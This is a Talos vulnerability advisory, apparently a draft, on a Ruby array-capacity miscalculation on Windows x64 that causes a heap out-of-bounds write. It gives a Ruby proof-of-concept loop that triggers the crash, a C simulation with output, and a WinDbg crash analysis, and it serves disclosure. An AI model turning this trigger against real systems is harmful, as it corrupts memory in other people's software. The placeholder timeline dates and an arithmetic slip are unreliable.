Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby wrong size of ARY_MAX_SIZE value break the functionality of ary_double_capa which leads to write out of bounds/buffer overflow.

:: Description

Value of ARY_MAX_SIZE used in calculation of new array capacity in ary_double_capa function is results of division of two elements. One of them is LONG_MAX and
because of LONG behavior on Windows platform and implementation of ary_double_capa function, capacity of array with elements more than ARY_MAX_SIZE(0x10000000)
on x64 platform will be wrongly calculated which will lead in consequences to write out of bound/buffer overflow.

:: Tested Versions

Ruby 2.3.0 dev
* Oberved only on Win x64

:: Product URLs

https://www.ruby-lang.org


:: Details

The bug can be triggered using below code:
	
-------------- PoC ------------------
puts "Script start"
puts "Creating array..."
a = Array.new
$i = 0 
while $i < 0x34000001 do
	a.push($i)
	$i += 1
end
-------------- PoC ------------------

Each time new array element is pushed, inter alia the following methods are executed:

array.c
917	VALUE
918	rb_ary_cat(VALUE ary, const VALUE *argv, long len)
919	{
920		long oldlen = RARRAY_LEN(ary);
921		VALUE target_ary = ary_ensure_room_for_push(ary, len);
922		ary_memcpy0(ary, oldlen, len, argv, target_ary);
923		ARY_SET_LEN(ary, oldlen + len);
924		return ary;
925	}
As You can imagine, before new element is added, some part of code checks whether array has proper amount of space and eventually reallocate
new space for data. It happens in ary_ensure_room_for_push:

353 static VALUE
354 ary_ensure_room_for_push(VALUE ary, long add_len)
355 {
356 long new_len = RARRAY_LEN(ary) + add_len;
	(...)
379 rb_ary_modify(ary);
380    capa = ARY_CAPA(ary);
381    if (new_len > capa) {
382        ary_double_capa(ary, new_len);
383    }
384
385    return ary;
386 }

If new length of array will be longer that it's current capacity function ary_double_capa will increase it properlly. Let's we take a look
on this function:

245	static void
246	ary_double_capa(VALUE ary, long min)
247	{
248		long new_capa = ARY_CAPA(ary) / 2;
249	
250		if (new_capa < ARY_DEFAULT_SIZE) {
251			new_capa = ARY_DEFAULT_SIZE;
252		}
253		if (new_capa >= ARY_MAX_SIZE - min) {
254			new_capa = (ARY_MAX_SIZE - min) / 2;
255		}
256		new_capa += min;
257		ary_resize_capa(ary, new_capa);
258	}

We can simulate action of this function for Windows x64 with the following code:

------------------- code --------------------
#include <string>
#include <stdio.h>
#include <string>


#include <cstdint>

#define ARY_DEFAULT_SIZE 16
#define VALUE 8
#define ARY_MAX_SIZE (LONG_MAX / VALUE)


long ary_double_capa(long capa,long min)
{
	long new_capa = capa / 2;
	if (new_capa < ARY_DEFAULT_SIZE) {
		new_capa = ARY_DEFAULT_SIZE;
	}
	if (new_capa >= ARY_MAX_SIZE - min) {
		new_capa = (ARY_MAX_SIZE - min) / 2;
	}
	new_capa += min;
	return new_capa;
}

void showInfo(long capa, long len)
{
	printf("capa : 0x%x   len : 0x%x\n",capa,len);
}
int main(int argc, char *argv[])
{
	
	long capa = ARY_MAX_SIZE - 8;	
	long len  = ARY_MAX_SIZE - 8;
	

	showInfo(capa,len);
	for(; len < ARY_MAX_SIZE + 0x10;len++)
	{
		capa = ary_double_capa(capa,len);
		showInfo(capa,len);
	}
	
	return 0;
}
------------------- code --------------------
Output:

capa : 0xffffff7    len : 0xffffff7
capa : 0xffffffb    len : 0xffffff7
capa : 0xffffffb    len : 0xffffff8
capa : 0xffffffc    len : 0xffffff9
capa : 0xffffffc    len : 0xffffffa
capa : 0xffffffd    len : 0xffffffb
capa : 0xffffffd    len : 0xffffffc
capa : 0xffffffe    len : 0xffffffd
capa : 0xffffffe    len : 0xffffffe
capa : 0xfffffff    len : 0xfffffff
capa : 0x10000000   len : 0x10000000
capa : 0x10000000   len : 0x10000001
capa : 0x10000001   len : 0x10000002
capa : 0x10000001   len : 0x10000003
capa : 0x10000002   len : 0x10000004
capa : 0x10000002   len : 0x10000005
capa : 0x10000003   len : 0x10000006
capa : 0x10000003   len : 0x10000007
capa : 0x10000004   len : 0x10000008
capa : 0x10000004   len : 0x10000009
capa : 0x10000005   len : 0x1000000a
capa : 0x10000005   len : 0x1000000b
capa : 0x10000006   len : 0x1000000c
capa : 0x10000006   len : 0x1000000d
capa : 0x10000007   len : 0x1000000e

As You can see above till 0x10000000 value function works correct, but for len bigger than 0x10000000 capacity is not increased properly.
Difference bettwen length and capacity become drastically more bigger each iteration.
Value of ARY_MAX_SIZE presents in the following way on different platforms:
#define ARY_MAX_SIZE (LONG_MAX / (int)sizeof(VALUE))

LONG_MAX on Windows platform does not change depends on arch bitnes but size of VALUE yes.
For x86 ARY_MAX_SIZE is equal: 
0x7fffffff / 4 = 0x1fffffff
where on x64
0x7fffffff / 8 = 0x0fffffff
Because of that behavior and signed type of long used to calculation,
array with lenght bigger than 0x10000000 will have wrongly allocated space for elements.

We can check how it exactly looks like when :
new_len  = 0x10000001  //in ary_double_capa function new_len becomes min argument
e.g capa = 0x10000000
We land in the following lines :

253		if (new_capa >= ARY_MAX_SIZE - min) {
254			new_capa = (ARY_MAX_SIZE - min) / 2;
255		}
256		new_capa += min;

Line 253 : ARY_MAX_SIZE - min is equal = 0x0fffffff - 0x10000001 = 0xfffffffe (-2)
Line 254 : Condition is true so new_capa equals -2 / 2 = -1
Line 256 : new_capa equal new_capa + min ==  -2 + 0x10000001 == 0x10000000

and so one. That wrong calculation leads later to bad new space allocation for array and in consequences write out of bound.

	
:: Crash analysis
	
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Unable to verify checksum for ruby.exe

FAULTING_IP: 
x64_msvcr120_ruby230!rb_obj_write+22 [t:\projects\bugs\ruby_debug\include\ruby\ruby.h @ 1322]
000007fe`e7b21302 488908          mov     qword ptr [rax],rcx

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 000007fee7b21302 (x64_msvcr120_ruby230!rb_obj_write+0x0000000000000022)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000001
   Parameter[1]: 00000001bf241000
Attempt to write to address 00000001bf241000

FAULTING_THREAD:  0000000000000b10

DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE

PROCESS_NAME:  ruby.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  0000000000000001

EXCEPTION_PARAMETER2:  00000001bf241000

WRITE_ADDRESS:  00000001bf241000 

FOLLOWUP_IP: 
x64_msvcr120_ruby230!rb_obj_write+22 [t:\projects\bugs\ruby_debug\include\ruby\ruby.h @ 1322]
000007fe`e7b21302 488908          mov     qword ptr [rax],rcx

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

FAULTING_LOCAL_VARIABLE_NAME:  slot

APP:  ruby.exe

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE

LAST_CONTROL_TRANSFER:  from 000007fee7b271b6 to 000007fee7b21302

STACK_TEXT:  
00000000`004ee2d0 000007fe`e7b271b6 : 00000000`03246bb8 00000001`bf241000 00000000`200003f1 000007fe`e7d39e88 : x64_msvcr120_ruby230!rb_obj_write+0x22
00000000`004ee310 000007fe`e7b22985 : 00000000`03246bb8 00000000`100001f8 0000007f`00000001 00000000`02230078 : x64_msvcr120_ruby230!ary_memcpy0+0x166
00000000`004ee390 000007fe`e7b294d6 : 00000000`03246bb8 00000000`02230078 00000000`00000001 000007fe`e7ad0119 : x64_msvcr120_ruby230!rb_ary_cat+0x85
00000000`004ee3f0 000007fe`e7b004da : 00000000`00000001 00000000`02230078 00000000`03246bb8 000007fe`e7adefc5 : x64_msvcr120_ruby230!rb_ary_push_m+0x26
00000000`004ee420 000007fe`e7b018bc : 000007fe`e7b294b0 00000000`03246bb8 00000000`00000001 00000000`02230078 : x64_msvcr120_ruby230!call_cfunc_m1+0x2a
00000000`004ee450 000007fe`e7b01c36 : 00000000`00632380 00000000`0232ffa0 00000000`02ab6178 00000000`03246d80 : x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x45c
00000000`004ee610 000007fe`e7b0753b : 00000000`00632380 00000000`0232ffa0 00000000`02ab6178 00000000`00000000 : x64_msvcr120_ruby230!vm_call_cfunc+0x66
00000000`004ee640 000007fe`e7b0f96c : 00000000`00632380 00000000`00000000 00000000`00000000 000007fe`e7ab74d8 : x64_msvcr120_ruby230!vm_exec_core+0x34cb
00000000`004ef460 000007fe`e7af8b2c : 00000000`00632380 00000000`03246e38 00000000`03246e38 00000000`000060ab : x64_msvcr120_ruby230!vm_exec+0xdc
00000000`004ef720 000007fe`e7a8a419 : 00000000`03246e38 00000000`006fd3f8 00000000`00000000 00000000`00000000 : x64_msvcr120_ruby230!rb_iseq_eval_main+0x2c
00000000`004ef770 000007fe`e7a88d1d : 00000000`03246e38 00000000`03246e38 00000000`03246e38 00000000`00000000 : x64_msvcr120_ruby230!ruby_exec_internal+0xe9
00000000`004ef910 000007fe`e7a886a3 : 00000000`03246e38 00000000`004ef960 00000000`00000000 00000000`004ef9c8 : x64_msvcr120_ruby230!ruby_exec_node+0x1d
00000000`004ef940 00000001`3f231041 : 00000000`03246e38 00000000`00661750 01d08f0c`cc7cc765 00000000`00000000 : x64_msvcr120_ruby230!ruby_run_node+0x33
00000000`004ef980 00000001`3f2312a7 : 00000000`00000002 00000000`00661750 00000000`00000000 00000000`00000000 : ruby!main+0x41
00000000`004ef9c0 00000000`778459cd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ruby!__tmainCRTStartup+0x10f
00000000`004ef9f0 00000000`7797b981 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
00000000`004efa20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x1d


FAULTING_SOURCE_LINE:  t:\projects\bugs\ruby_debug\include\ruby\ruby.h

FAULTING_SOURCE_FILE:  t:\projects\bugs\ruby_debug\include\ruby\ruby.h

FAULTING_SOURCE_LINE_NUMBER:  1322

FAULTING_SOURCE_CODE:  
  1318: #ifdef RGENGC_LOGGING_WRITE
  1319:     RGENGC_LOGGING_WRITE(a, slot, b, filename, line);
  1320: #endif
  1321: 
> 1322:     *slot = b;
  1323: 
  1324: #if USE_RGENGC
  1325:     rb_obj_written(a, Qundef /* ignore `oldv' now */, b, filename, line);
  1326: #endif
  1327:     return a;


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  x64_msvcr120_ruby230!rb_obj_write+22

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: x64_msvcr120_ruby230

IMAGE_NAME:  x64-msvcr120-ruby230.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  555390cd

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_x64-msvcr120-ruby230.dll!rb_obj_write

BUCKET_ID:  X64_APPLICATION_FAULT_INVALID_POINTER_WRITE_DETOURED_x64_msvcr120_ruby230!rb_obj_write+22

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/ruby_exe/2_3_0_0/555390cd/x64-msvcr120-ruby230_dll/2_3_0_0/555390cd/c0000005/000a1302.htm?Retriage=1

Followup: MachineOwner
---------

0:000> r
rax=00000001bf241000 rbx=0000000000000000 rcx=00000000200003f1
rdx=00000001bf241000 rsi=0000000000000000 rdi=0000000000000000
rip=000007fee7b21302 rsp=00000000004ee2d0 rbp=0000000000000000
 r8=00000000200003f1  r9=000007fee7d39e88 r10=0000000000000001
r11=00000000004ee008 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
x64_msvcr120_ruby230!rb_obj_write+0x22:
000007fe`e7b21302 488908          mov     qword ptr [rax],rcx ds:00000001`bf241000=????????????????
0:000> kn
 # Child-SP          RetAddr           Call Site
00 00000000`004ee2d0 000007fe`e7b271b6 x64_msvcr120_ruby230!rb_obj_write+0x22 [t:\projects\bugs\ruby_debug\include\ruby\ruby.h @ 1322]
01 00000000`004ee310 000007fe`e7b22985 x64_msvcr120_ruby230!ary_memcpy0+0x166 [t:\projects\bugs\ruby_debug\array.c @ 185]
02 00000000`004ee390 000007fe`e7b294d6 x64_msvcr120_ruby230!rb_ary_cat+0x85 [t:\projects\bugs\ruby_debug\array.c @ 923]
03 00000000`004ee3f0 000007fe`e7b004da x64_msvcr120_ruby230!rb_ary_push_m+0x26 [t:\projects\bugs\ruby_debug\array.c @ 947]
04 00000000`004ee420 000007fe`e7b018bc x64_msvcr120_ruby230!call_cfunc_m1+0x2a [t:\projects\bugs\ruby_debug\vm_insnhelper.c @ 1246]
05 00000000`004ee450 000007fe`e7b01c36 x64_msvcr120_ruby230!vm_call_cfunc_with_frame+0x45c [t:\projects\bugs\ruby_debug\vm_insnhelper.c @ 1418]
06 00000000`004ee610 000007fe`e7b0753b x64_msvcr120_ruby230!vm_call_cfunc+0x66 [t:\projects\bugs\ruby_debug\vm_insnhelper.c @ 1514]
07 00000000`004ee640 000007fe`e7b0f96c x64_msvcr120_ruby230!vm_exec_core+0x34cb [t:\projects\bugs\ruby_debug\insns.def @ 1075]
08 00000000`004ef460 000007fe`e7af8b2c x64_msvcr120_ruby230!vm_exec+0xdc [t:\projects\bugs\ruby_debug\vm.c @ 1455]
09 00000000`004ef720 000007fe`e7a8a419 x64_msvcr120_ruby230!rb_iseq_eval_main+0x2c [t:\projects\bugs\ruby_debug\vm.c @ 1701]
0a 00000000`004ef770 000007fe`e7a88d1d x64_msvcr120_ruby230!ruby_exec_internal+0xe9 [t:\projects\bugs\ruby_debug\eval.c @ 260]
0b 00000000`004ef910 000007fe`e7a886a3 x64_msvcr120_ruby230!ruby_exec_node+0x1d [t:\projects\bugs\ruby_debug\eval.c @ 323]
0c 00000000`004ef940 00000001`3f231041 x64_msvcr120_ruby230!ruby_run_node+0x33 [t:\projects\bugs\ruby_debug\eval.c @ 314]
0d 00000000`004ef980 00000001`3f2312a7 ruby!main+0x41 [t:\projects\bugs\ruby_debug\main.c @ 38]
0e 00000000`004ef9c0 00000000`778459cd ruby!__tmainCRTStartup+0x10f [f:\dd\vctools\crt\crtw32\dllstuff\crtexe.c @ 626]
0f 00000000`004ef9f0 00000000`7797b981 kernel32!BaseThreadInitThunk+0xd
10 00000000`004efa20 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
0:000> .frame 2
02 00000000`004ee390 000007fe`e7b294d6 x64_msvcr120_ruby230!rb_ary_cat+0x85 [t:\projects\bugs\ruby_debug\array.c @ 923]
0:000> dv
            ary = 0x3246bb8
           argv = 0x00000000`02230078
            len = 0n1
     target_ary = 0x3246bb8
         oldlen = 0n268435960
		 
0:000> dt -b RArray poi(ary)
x64_msvcr120_ruby230!RArray
   +0x000 basic            : RBasic
      +0x000 flags            : 7
      +0x008 klass            : 0x715de0
   +0x010 as               : <unnamed-tag>
      +0x000 heap             : <unnamed-tag>
         +0x000 len              : 0n268435960
         +0x008 aux              : <unnamed-tag>
            +0x000 capa             : 0n268435708
            +0x000 shared           : 0x100000fc
         +0x010 ptr              : 0x00000001`3f240040 
      +0x000 ary              : 
       [00] 0x100001f8
       [01] 0x100000fc
       [02] 0x00000001`3f240040
	   
0:000> !address 0x00000001`3f240040

                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...


Usage:                  Heap
Base Address:           00000001`3f240000
End Address:            00000001`bf241000
Region Size:            00000000`80001000
State:                  00001000	MEM_COMMIT
Protect:                00000004	PAGE_READWRITE
Type:                   00020000	MEM_PRIVATE
Allocation Base:        00000001`3f240000
Allocation Protect:     00000004	PAGE_READWRITE
More info:              heap owning the address: !heap 0x630000
More info:              heap large/virtual block
More info:              heap entry containing the address: !heap -x 0x13f240040

0:000> r
rax=00000001bf241000 rbx=0000000000000000 rcx=00000000200003f1
rdx=00000001bf241000 rsi=0000000000000000 rdi=0000000000000000
rip=000007fee7b21302 rsp=00000000004ee2d0 rbp=0000000000000000
 r8=00000000200003f1  r9=000007fee7d39e88 r10=0000000000000001
r11=00000000004ee008 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
x64_msvcr120_ruby230!rb_obj_write+0x22:
000007fe`e7b21302 488908          mov     qword ptr [rax],rcx ds:00000001`bf241000=????????????????

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: References


:: Timeline

2015-05-10 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure